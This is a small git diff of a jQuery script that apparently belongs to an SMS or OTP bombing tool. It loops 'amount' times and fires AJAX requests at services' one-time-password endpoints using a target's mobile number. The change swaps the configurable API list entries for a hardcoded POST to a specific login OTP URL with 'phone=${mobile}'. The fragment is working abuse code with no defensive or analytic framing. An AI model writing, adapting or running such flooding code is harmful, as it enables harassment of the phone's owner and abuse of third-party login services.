@@ -56,10 +56,9 @@ $(document).ready(() => {
                     while (c < amount) {
                         APIS.forEach(API => {
                             config = {
-                                url: API.url.replace("*****", mobile),
-                                method: API.method,
-                                headers: API.headers,
-                                body: API.body.replace("*****", mobile)
+                                url: "https://ss.binge.buzz/otp/send/login",
+                                method: "POST",
+                                body: `phone=${mobile}`
                             }
                             $.ajax(config);
                             c += 1;
